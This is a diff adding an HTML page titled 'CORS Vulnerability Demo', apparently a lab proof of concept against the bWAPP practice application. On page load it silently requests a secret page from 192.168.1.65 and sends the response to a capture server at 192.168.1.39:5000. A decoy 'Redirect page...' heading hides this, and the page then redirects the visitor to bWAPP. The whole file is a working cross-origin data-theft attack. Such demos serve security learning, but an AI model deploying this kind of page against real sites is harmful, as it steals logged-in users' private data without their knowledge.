@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Vulnerability Demo</title>
+</head>
+<body onload="fetchData()">
+    <h1>Redirect page...</h1>
+    <script>
+        function fetchData() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://192.168.1.65/bWAPP/secret-cors-1.php', true);
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        fetch("http://192.168.1.39:5000/capture?response=" + encodeURIComponent(xhr.responseText));
+                    } else {
+                        fetch("http://192.168.1.39:5000/capture?response=" + encodeURIComponent(xhr.status));
+                    }
+                }
+            };
+
+            xhr.send();
+
+            window.location.href="http://192.168.1.65/bWAPP"
+        }
+    </script>
+</body>
+</html>
